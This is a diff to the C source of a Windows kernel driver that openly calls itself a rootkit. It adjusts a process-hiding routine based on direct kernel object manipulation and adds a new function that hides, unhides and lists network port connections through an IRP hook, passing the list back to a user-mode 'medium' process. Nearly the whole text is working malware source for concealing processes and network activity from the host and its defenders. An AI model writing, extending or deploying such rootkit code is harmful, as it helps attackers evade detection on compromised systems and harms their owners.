@@ -1,5 +1,6 @@
 #include "requests.h"
 #pragma warning(disable:4996)
+#pragma warning(disable:4302)
 
 
 
@@ -795,7 +796,7 @@ NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
 		RootkInst->Size = TempSize;
 		Status = KernelToUserMEM(MediumProcess, HiddenInput, RootkInst->Out, RootkInst->Size, FALSE);
 		if (!NT_SUCCESS(Status)) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (KernelToUserMEM() of string failed: %p, %p, %zu)\n", RootkInst->Out, RootkInst->Buffer, RootkInst->Size);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (KernelToUserMEM() of list failed: %p, %p, %zu)\n", RootkInst->Out, RootkInst->Buffer, RootkInst->Size);
 			if (HiddenInput != NULL) {
 				ExFreePool(HiddenInput);
 			}
@@ -805,6 +806,84 @@ NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
 			ExFreePool(HiddenInput);
 		}
 		DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM/hook succeeded\n");
+	}
+	return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
+}
+
+
+NTSTATUS HidePortConnectionRK(ROOTKIT_MEMORY* RootkInst) {
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide port connection via IRP hook (port number = %hu, index = %hu)\n", (USHORT)RootkInst->Buffer, (USHORT)RootkInst->Reserved);
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+	PEPROCESS MediumProcess = { 0 };
+	KAPC_STATE MediumState = { 0 };
+	PVOID TempOutput = NULL;
+	PVOID HiddenInput = NULL;
+	ULONG64 TempSize = 0;
+	ULONG64 PortManType = RootkInst->Size;
+
+
+	// Check for invalid arguments:
+	if (((USHORT)RootkInst->Buffer == 0 && (USHORT)RootkInst->Reserved == 0 && PortManType != ListHiddenPorts) ||
+		!(PortManType == HidePort || PortManType == UnhidePort || PortManType == ListHiddenPorts) ||
+		(PortManType == HidePort && (USHORT)RootkInst->Buffer == 0) || 
+		(PortManType == ListHiddenPorts && RootkInst->MedPID == 0) ||
+		(PortManType == ListHiddenPorts && RootkInst->Out == NULL)) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide port connection via IRP hook failed (invalid port: %hu / invalid index %hu / invalid medium PID %hu / invalid request number: %llu / invalid output buffer: %p)\n", (USHORT)RootkInst->Buffer, (USHORT)RootkInst->Reserved, (USHORT)RootkInst->MedPID, PortManType, RootkInst->Out);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
+	}
+
+
+	// Handle the different requests:
+	if (PortManType == HidePort) {
+
+		// Pass port to hide in case its not already in the list:
+		if (irphooking::port_list::CheckIfInPortList((USHORT)RootkInst->Buffer, NULL)) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide port connection via IRP hook, port %hu is already hidden\n", (USHORT)RootkInst->Buffer);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
+		}
+		Status = irphooking::port_list::AddToPortList((USHORT)RootkInst->Buffer);
+		if (!NT_SUCCESS(Status)) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide port connection via IRP hook failed (hiding function with port of %hu failed with status 0x%x)\n", (USHORT)RootkInst->Buffer, Status);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
+		}
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide port connection via IRP hook succeeded, hidden process with port of %hu\n", (USHORT)RootkInst->Buffer);
+	}
+	else if (PortManType == UnhidePort) {
+
+		// Pass the index and port number arguments and return the result:
+		Status = irphooking::port_list::RemoveFromPortList((USHORT)RootkInst->Buffer, (USHORT)RootkInst->Reserved);  // Remove via index/port number
+		if (!NT_SUCCESS(Status)) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide hidden port connection via IRP hook failed (unhiding function with port of %hu / index of %hu failed with status 0x%x)\n", (USHORT)RootkInst->Buffer, (USHORT)RootkInst->Reserved, Status);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
+		}
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide hidden port connection via IRP hook succeeded, unhidden port %hu, index %hu\n", (USHORT)RootkInst->Buffer, (USHORT)RootkInst->Reserved);
+	}
+	else {
+
+		// List hidden ports - attach to medium, allocate memory for list and return list:
+		if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MedPID, &MediumProcess))) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden ports connections failed (cannot get EPROCESS of medium process with PID of %llu)\n", RootkInst->MedPID);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
+		}
+		if (!NT_SUCCESS(irphooking::port_list::ReturnPortList(&HiddenInput, &TempSize))) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden ports connections, hidden port list is empty!\n");
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
+		}
+		TempOutput = RootkInst->Out;
+		KeStackAttachProcess(MediumProcess, &MediumState);
+		TempOutput = memory_helpers::AllocateMemoryADD(TempOutput, TempSize, &MediumState, 0);
+		if (TempOutput == NULL) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden ports connections failed (Allocation of memory for list in medium failed: %p, %llu)\n", TempOutput, TempSize);
+			return requests_helpers::ExitRootkitRequestADD(NULL, MediumProcess, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
+		}
+		RootkInst->Out = TempOutput;
+		RootkInst->Size = TempSize;
+		Status = KernelToUserMEM(MediumProcess, HiddenInput, RootkInst->Out, RootkInst->Size, FALSE);
+		if (!NT_SUCCESS(Status)) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden ports connections failed (KernelToUserMEM() of list failed: %p, %p, %zu)\n", RootkInst->Out, RootkInst->Buffer, RootkInst->Size);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
+		}
+		DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden ports connections succeeded\n");
 	}
 	return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 }
